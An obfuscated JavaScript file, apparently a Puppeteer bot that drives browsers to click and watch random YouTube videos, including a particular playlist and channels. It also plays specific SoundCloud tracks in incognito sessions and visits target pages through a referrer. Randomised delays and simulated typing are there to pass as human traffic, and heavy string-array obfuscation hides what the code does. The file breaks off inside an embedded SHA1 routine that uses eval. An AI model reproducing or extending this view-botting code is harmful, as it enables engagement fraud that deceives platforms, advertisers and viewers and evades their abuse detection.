const Z = d,
  Y = c,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x11ba * 0x2 + 0x99a * -0x2 + 0x103f * -0x1))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x10e * -0x1b + 0x3f * 0x6a + -0x308 * 0x12), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1 * -0xacb + -0x1b6f + 0xe9 * 0x2a);
    let h = e[f];
    if (b['SKWvVK'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1442 * -0x1 + -0x54d * -0x1 + -0x198f, s, t, u = -0x1 * -0x21fe + -0x25 * 0x61 + 0x13f9 * -0x1; t = n['charAt'](u++); ~t && (s = r % (0xcdd * 0x1 + 0x1faf * 0x1 + -0xe4 * 0x32) ? s * (-0x5ae * -0x3 + 0x1209 + 0x5 * -0x6f7) + t : t, r++ % (0x983 + -0x2313 * 0x1 + 0x1 * 0x1994)) ? p += String['fromCharCode'](0xffb * -0x1 + 0xa7b + 0x67f & s >> (-(-0x1f57 + 0x22 * 0xd9 + 0x1 * 0x287) * r & 0x1 * -0x1bca + -0x2 * -0xda6 + 0xc * 0xb)) : 0xd93 + 0x1610 * 0x1 + -0xbe1 * 0x3) {
          t = o['indexOf'](t);
        }
        for (let v = 0x30c + 0x163f + -0x194b, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xc * -0x27f + -0xd1e + 0x26 * -0x71))['slice'](-(0x135c + 0x15da + -0x6de * 0x6));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1548 + 0x79a * 0x5 + -0x2 * 0x85d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x183a + 0x2 * -0x1d3 + 0xc * -0x1b7; u < 0x22d8 + 0x1534 + -0x370c; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0x20a1 + -0x26ed + 0x64c; u < 0x147a + -0x833 + 0xb47 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x7c3 + 0x4b + -0x8 * -0x10f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1b9a + 0x1c3b + 0x7 * -0x17, q = -0x712 * -0x5 + 0x1d60 + 0x2 * -0x205d;
        for (let v = 0x4f2 + 0x307 * -0x9 + -0x164d * -0x1; v < n['length']; v++) {
          u = (u + (0x22a * -0x1 + 0xec * 0xf + -0xba9)) % (-0x1332 + -0x313 * -0x4 + 0x6 * 0x151), q = (q + p[u]) % (0x67 * -0x7 + 0xa32 * 0x3 + 0x1 * -0x1ac5), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1971 + -0xdcf + 0x2 * -0x551)]);
        }
        return t;
      };
      b['WfozYH'] = m, c = arguments, b['SKWvVK'] = !![];
    }
    const j = e[-0x2 * -0x313 + -0xfb * 0x4 + -0x23a],
      k = f + j,
      l = c[k];
    return !l ? (b['HIwVBY'] === undefined && (b['HIwVBY'] = !![]), h = b['WfozYH'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1e * -0x625 + 0x143f + 0x11947 + (0x1 * 0x3d2b + -0x67c4 + 0x9d * 0xa5) * random()) : await standardWaitForNetIdle(f), await wait(0x18d6 + -0x2057 + -0x9 * -0x301 + (0x19 * 0x2a5 + 0x1ddd + 0x38ea * -0x1) * random()), 0x179 + 0x6b * 0x24 + 0x97 * -0x1c;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x18af * -0x1 + 0xbd9 + 0x565 * 0x6), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1547 + -0xe * 0x27b + -0x43 * -0xd6;
}
async function randomWait() {
  return await wait(0x3 * -0x5f3 + -0x1 * -0x21be + 0x3a3 + (0x118c + -0xe2d * 0x2 + 0xf2b * 0x2) * random()), -0x2 * -0x118b + -0xb36 + 0x15 * -0x123;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x59 * 0x30 + 0x1263 + -0x2313, -0x1c74 + -0x1 * -0x20a1 + -0x426), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xe737 + 0xf5bb + 0xdbdc) * getRandomInt(0x1097 + -0x1 * -0x18ad + -0x2942, 0x1f0f + -0x5f * 0x32 + -0xc7c), h)), 0x2a1 * 0x1 + -0xf8d * -0x1 + -0x122d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xff * -0x21 + 0x974 + 0x877 * -0x5;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xded + 0x44 * -0x83 + 0x2 * 0xa70]['split']('\x20');
    for (let k = 0x1896 + -0x16cf * 0x1 + -0x41 * 0x7; k < i['length']; k += 0x1f54 + 0x3 * 0x5b3 + 0x306b * -0x1)
      j += i[k] * h[i[k + (0xf4 * 0x26 + 0x10b3 + -0x34ea)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + R(0xd, '^NOt')), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te'](S(0x2)))['slice'](0x3 * -0x49b + 0x24da + -0x2b * 0x89)['map'](l => Array['from'](l['children']))['flat'](0x754 + -0x1905 + 0x1e * 0x97)['map'](l => l['childNodes'][-0x41d * 0x9 + 0x5e2 + 0x7c9 * 0x4]['childNodes'][-0x24a3 + 0x199 * 0xd + 0xfde * 0x1]['childNodes'][0x1956 + -0xf94 * -0x1 + -0x28e9]['childNodes'][-0xd79 * -0x2 + -0x1df * 0x11 + -0x53 * -0xf]['childNodes'][-0x1be * -0x3 + 0x212b + 0x444 * -0x9]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x4 * 0x71e + 0x23e3 + -0x383, 0x1 * -0xa4a + 0x89f * 0x4 + -0x4aa)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x18e * 0x43 + -0x20 * -0x8b + -0x3ef2);
  const h = await getMaxTime(f),
    i = Math['min']((0x1 * 0x9aab + 0xe0e4 + 0x1 * -0x912f) * getRandomInt(-0x1a1f * 0x1 + -0x1 * -0x2414 + -0x9f3, 0x2457 + 0x9da * 0x3 + 0x20f * -0x20), h);
  return await wait(i), 0x2 * -0x37c + -0x7 * 0x4d1 + 0x28b0;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x122f * -0x1 + 0x163 + 0x10cc]['children'][-0xd8b + -0x1 * 0x63a + -0x3 * -0x697]['children'][0xac5 + 0x1c19 * 0x1 + 0x32 * -0xc7]['children'][0xac1 * 0x2 + 0x1695 + 0x1 * -0x2c17]['children'][-0xa5d + 0x1541 * 0x1 + -0x1 * 0xae4]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x25ee + -0x138c + 0x6d * 0x87;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1223 * -0x1 + 0x2 * 0xd7d + 0x135 * -0x7 + (0x379 * 0x3 + -0x3b * -0x81 + -0x27f4) * random()
  }), await wait(0xe23 + 0x8 * 0x2d + -0x7 * 0x1f1 + (0xf * -0x22b + 0xe0 * -0xf + 0x2ed1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1bc3 + 0x816 + -0x23d7]['childNodes'][-0x26fb + -0x3f1 * 0x7 + 0x4293]['childNodes'][0x5 * -0x191 + -0x24c5 * -0x1 + -0x337 * 0x9]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xdf8 + -0x4 * 0x567 + 0x1 * 0x2399]['childNodes'][-0x5fb + -0xf63 + 0xa * 0x223]['childNodes'][0x20c8 + -0x23df + -0xd * -0x3d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x18a6 + 0x1e3c + -0x36e1),
          r = -0x166b + 0xffb * 0x1 + 0xce * 0x8;
        for (let u = -0x67 * 0x47 + -0xb7 * -0x1c + 0xb * 0xc7; u < q['length']; u += -0x24a9 * 0x1 + -0x7d3 * -0x2 + 0x1505 * 0x1)
          r += q[u] * k[q[u + (-0xceb * 0x1 + 0x6c8 + -0x624 * -0x1)]];
        return r;
      }(n);
  });
  await wait((0xda * -0x11 + 0x2f * -0x4f + -0x5793 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x3ea + -0xe2 * 0x133 + 0x1fd50) * getRandomInt(-0x4b0 * 0x8 + -0x2617 + 0x148 * 0x3b, 0x1c4 + 0x99 * 0x8 + -0x682), h + (-0x1064 + -0x1bd9 * -0x1 + 0x813));
  return await wait(i), -0x448 * -0x3 + -0x1843 + -0x2b * -0x44;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * -0xacb + -0x1b6f + 0xe9 * 0x2a);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function keyWatch(f) {
  const T = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x2607 + 0x165a + 0x1 * 0xfad), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + T(0x15) + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * -0x1e1b + 0x200c + -0x326f + (0x903 + -0x887 + 0x36c) * Math['random']());
    });
  }, 0x67 * -0x59 + 0x3189 + 0xe * 0xf9);
  await wait(-0x22 * -0x25c9 + 0x5c82f + -0x63901);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x2a * 0x193 + 0xe8c1 + 0x43bd) * getRandomInt(-0x6bc + 0xa26 * -0x2 + 0x1b0c, 0x10 * -0x13b + -0x20f1 + 0x22 * 0x18d)), clearInterval(h), -0x2 * 0x17d + -0x936 + 0xc31 * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x80a * 0x3 + -0x123d + 0x7 * 0x60d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x2491 + 0x1 * -0x162b + 0x14f * -0xb;
    await randomWait();
  }
  return 0x17d3 + 0x20d1 + -0x38a3;
}

function fetchRandomSC() {
  const U = d;
  return Math['random']() <= -0x1 * -0x1bf2 + 0x1252 + 0x2 * -0x1722 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x110 * 0x16 + 0x956 * 0x3 + -0x4a2 * 0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + U(0xf) + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + U(0x0) + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const aD = {
      f: 'ox]5'
    };
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1cf8 + -0x1b35 * 0x1 + 0x382d + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x12b * 0x10 + -0x220c + -0x12 * -0x2ee;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xb5d0 + -0x15cfd + 0x156f5 * 0x1 + getRandomInt(0x1 * -0x14c3 + 0x2 * -0x2f0f + -0x189 * -0x71, -0x35b * 0xf + -0x3ca * 0x17 + 0xefb * 0x11));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x429 + -0x1 * 0x202d + 0x9 * 0x31d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x6 * -0x42c + -0x17c2 + -0x146;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1647 + 0x8 * -0x19a + -0x977 * 0x1, -0x89 * -0x4 + 0x1e68 + -0x205a)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x11a7 + 0x1607 + -0x1fde + floor((0x17 * -0x124 + -0x49 * 0x61 + 0x39cd) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x4dd94254 + 0x2481ca * 0x7c + 0x5e15323e * 0x2),
          0x1 * -0xf25fcd + -0x68984d + 0xed7c0d * 0x2,
          0xdef8 + -0x2c * 0xca + -0x3c40,
          0x26ba + 0x49 * -0x3e + 0xa46 * -0x2
        ], y = [
          0x138f + -0x17e6 + 0x46f,
          0x2f * -0x6a + -0x8c5 + 0x1 * 0x1c4b,
          0x11 * -0x22c + 0x1846 + -0x2 * -0x657,
          -0x19ba + -0xd19 + 0x26d3
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x167 * -0x1 + 0x468 * 0x8 + -0x24a6)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1e8e + -0xfd5 + -0xeb9; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xaef + -0x1cf * -0x4 + -0x122b * 0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1716 + -0x800 + 0x1f16] = A[0x12 * 0x1f0 + -0x163 * -0x18 + -0x4418] = A[-0xb30 + 0x17ba + -0xc89] = A[0xe * 0x61 + -0x17e8 + 0x6 * 0x31a] = A[-0x1534 + -0x1201 + 0x2738] = A[0x76 * -0x35 + 0x3b * -0x2f + 0x1 * 0x2347] = A[-0xec * -0x1 + 0x4fa + 0x5 * -0x12d] = A[0x11f * 0x7 + 0x17b4 + 0x1 * -0x1f87] = A[0xb81 + 0x3 * 0x88b + -0x251b] = A[-0xa7 * -0x2e + 0x483 * -0x7 + 0x19b] = A[-0x255e + 0x24f + 0x2318] = A[-0x1f33 + 0x22b0 + -0x1 * 0x373] = A[-0x2 * 0x6f1 + 0x18e4 + -0xaf7] = A[-0x125f + -0xa6 * 0x1d + -0xd * -0x2dd] = A[-0x18e * 0x3 + -0x856 + 0xd0d] = A[0xa53 + -0x42d * -0x3 + -0x16cc] = A[-0x9b9 * 0x1 + -0x2624 + 0x2fec] = 0x1d9f * 0x1 + -0x363 * 0xb + -0x7a2 * -0x1, this['blocks'] = A) : this['blocks'] = [
                0x14c8 + 0xf * 0x173 + 0x5 * -0x881,
                0x76 * -0x25 + 0x5 * 0x2f + 0x3 * 0x561,
                -0x1c7a + -0x1 * 0x1757 + 0x33d1,
                -0x16d3 + -0xe8 * -0x8 + -0x9 * -0x1bb,
                0xa59 * 0x2 + 0x10af + -0x1 * 0x2561,
                -0x19f * 0xe + -0x1d * 0x117 + 0x1 * 0x364d,
                -0x1c8b + -0x17 * 0x199 + 0x414a,
                0x1ae1 + -0x3 * -0x5 + -0x1af0,
                0xc22 + -0x1 * 0xdad + 0x18b * 0x1,
                -0x1 * -0x241d + -0x20e1 + -0x33c,
                -0x27 * 0x49 + -0x1 * 0x5b3 + 0x1 * 0x10d2,
                0x857 + -0x1eee + 0x1 * 0x1697,
                -0xf90 + -0x5c1 * 0x1 + 0x1 * 0x1551,
                0x139f + -0x1 * 0x18f5 + 0x556,
                0x1151 + -0x23fc + 0x639 * 0x3,
                0x1 * 0xca1 + 0x20f4 + -0x7 * 0x683,
                -0x21f0 + -0x1820 + 0x3a10
              ], this['h0'] = -0x86a27df + 0x3 * -0x1952aa17 + -0x1 * -0xbba74925, this['h1'] = -0x1de1145c3 + -0x42ac19 * -0x55d + -0x16849ef37 * -0x1, this['h2'] = -0x714dad5 * -0x1 + -0xe29c7 * 0x2dd + -0xd4 * -0xe0d8e9, this['h3'] = 0x112e60ab + 0xebb94b1 * -0x1 + -0x1 * -0xdbf887c, this['h4'] = 0x98b255b * 0x21 + -0x14336474f + 0x660cac42 * 0x2, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x3a5 * 0x7 + -0x5b * -0x68 + -0x3e7b, this['finalized'] = this['hashed'] = 0x186e + -0x8 * -0x38 + -0x1a2e, this['first'] = -0x207 * 0xf + -0x1ad8 + -0x7 * -0x82e;
            }
            ['update'](J) {
              const V = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1190 * 0x2 + 0x8 * -0x2d1 + 0x99c * 0x6, O = J['length'] || -0x4b7 + 0x22f0 + -0x1e39, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x239c + -0x1 * -0x1be + 0x1 * -0x255a, P[-0x1 * 0x592 + -0x1973 + 0x1f05] = this[V(0x4, aD.f)], P[0xd5 * -0x20 + -0x3 * 0x85d + 0xb * 0x4b5] = P[-0x59c + -0x47f * -0x1 + 0x11e] = P[0x9f4 + 0x19a * 0x12 + -0x26c6 * 0x1] = P[0x20ae + 0x8a3 + -0x22 * 0x137] = P[0x6 * 0x83 + 0x17ac + 0x2 * -0xd5d] = P[-0x1 * -0x1196 + -0x1 * 0x3b3 + -0xdde] = P[-0x25 * -0x11 + 0x19b3 + 0x22a * -0xd] = P[-0xa83 * -0x3 + 0x1 * 0x100e + -0x2f90] = P[0x9f5 * 0x2 + -0x210b + -0x3 * -0x463] = P[-0x17 * -0x141 + 0x1 * 0x7b9 + -0xc2d * 0x3] = P[0xa1c + 0x8b * -0x7 + -0x645] = P[0x281 * 0x9 + -0x41 * 0x7a + 0x87c * 0x1] = P[-0x1561 * -0x1 + 0xb00 + -0x2055] = P[0x5dd + -0x248b * -0x1 + -0x60d * 0x7] = P[-0x1702 + 0x9c1 + 0xd4f] = P[0x5 * -0x435 + -0x113 * -0x13 + -0x7 * -0x19] = -0x79a + 0x2 * -0x27a + 0xc8e), K) {
                    for (N = this['start']; M < O && N < 0x26a1 + 0x1a70 + -0x40d1; ++M)
                      P[N >> 0x817 * 0x2 + -0x3b9 * 0x2 + -0x8ba] |= J[M] << y[0xd41 + 0x2055 + -0x2d93 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2 * -0x58a + -0x7c7 * -0x1 + -0x129b; ++M)
                      (L = J['charCodeAt'](M)) < 0x29 * -0x6e + 0x7d6 + 0xa48 ? P[N >> -0x1501 + -0x148e + 0x3 * 0xddb] |= L << y[-0x50 * -0x5e + -0x3ef * 0x7 + 0xd * -0x24 & N++] : L < 0x5 * -0x3aa + -0x5ba + -0x200c * -0x1 ? (P[N >> -0x25f7 + 0x516 + 0x20e3] |= (-0x1a0f + -0x1fae * -0x1 + -0x4df | L >> -0x3 * 0x7cf + -0xb78 + -0x1 * -0x22eb) << y[-0x3 * 0x552 + 0xc * -0x105 + -0x1c35 * -0x1 & N++], P[N >> -0x10a9 + -0xfd9 * 0x2 + -0x305d * -0x1] |= (-0xd * -0xee + 0xad9 + 0x1 * -0x166f | 0x742 + 0x4 * -0xa9 + -0x3 * 0x175 & L) << y[0x2471 * -0x1 + 0x25fd + -0x189 & N++]) : L < 0xe326 + 0xf80 + -0x1aa6 || L >= 0x8eb2 + 0x18 * -0x9e6 + 0x13ede ? (P[N >> -0x1d12 + 0x374 + 0x29 * 0xa0] |= (0x1fab + -0x2689 + 0x2 * 0x3df | L >> -0xaf3 * -0x2 + -0x21b5 + -0x1 * -0xbdb) << y[0x1db6 + 0x922 + -0x26d5 & N++], P[N >> -0x26f7 + -0x1207 + 0x3900] |= (0x93f * -0x1 + 0x24c8 + 0x1 * -0x1b09 | L >> 0x1a6 * -0x13 + 0x1633 * 0x1 + 0x1 * 0x925 & -0x5bb + 0x1e0e + -0x1814) << y[-0x1 * -0xe05 + 0xf * 0x1b + -0xf97 & N++], P[N >> 0xcbf + 0xe9b * -0x1 + -0x1 * -0x1de] |= (0x1988 + -0xb29 + -0x43 * 0x35 | 0x120d + 0xe9 * 0x1d + -0x2c33 & L) << y[-0x17 * 0x5f + -0x231b + 0x3 * 0xe8d & N++]) : (L = -0x5480 * -0x4 + 0x125fe + -0x177fe + ((-0x2 * 0xb7a + 0x2112 + -0x61f * 0x1 & L) << -0x1d62 + 0xc39 + 0x1133 | 0x10 + 0x3 * 0x99f + -0xc77 * 0x2 & J['charCodeAt'](++M)), P[N >> -0x59 * 0x17 + 0x1f82 * -0x1 + 0x2783 * 0x1] |= (0x173a + 0x209c + -0x36e6 | L >> -0x35 * 0x9d + 0x1 * 0xb62 + 0x9b * 0x23) << y[-0xeaa + 0x1f4e * -0x1 + 0x2dfb & N++], P[N >> -0x11ee + -0x35 * -0x1d + 0x1 * 0xbef] |= (-0x221 * -0xf + 0x2 * 0x62f + -0x1 * 0x2bcd | L >> 0x1a17 + 0x13 * -0x9a + 0x1 * -0xe9d & 0xbae + -0x17 * -0x21 + 0xc2 * -0x13) << y[-0x1cfa * -0x1 + 0x18e + -0x1e85 & N++], P[N >> 0x20d3 + 0x5 * -0x3 + -0x20c2] |= (-0x27 * 0x4f + -0xde + -0x2f * -0x49 | L >> 0x8d4 + -0x1ad1 + 0x35 * 0x57 & 0xbaa + 0x1b7 * -0x7 + -0x96 * -0x1) << y[0x7c * -0x2b + 0x4f3 + 0xfe4 & N++], P[N >> -0x4fe + -0xeac + 0x13ac] |= (0x2684 + 0xaa5 * -0x1 + 0x4d * -0x5b | 0xb * -0x334 + -0x1078 * -0x1 + -0x1 * -0x1303 & L) << y[0x1c8b + -0x52 * -0x25 + -0x2862 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1610 + -0x1 * -0x53b + 0x1115 ? (this['block'] = P[0x3f2 + -0x1512 + 0x1130], this['start'] = N - (0x1052 + 0x1 * 0x1aef + -0x2b01), this['hash'](), this['hashed'] = 0x1 * 0x2151 + 0xb8a + -0x2cda) : this['start'] = N;
                }
                return this['bytes'] > 0xa6c03548 + -0x12d9d2b0b + -0x2 * -0xc36e7ae1 && (this['hBytes'] += this['bytes'] / (-0x14ba8b074 + 0x281b * 0xa0bd8 + 0x1 * 0xb8bfb0ac) << 0x2503 + 0x1401 + -0xe41 * 0x4, this['bytes'] = this['bytes'] % (-0x67ffb574 + -0x176a69a90 + 0x2dea65004)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x400 + -0x24a2 + 0x28a3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
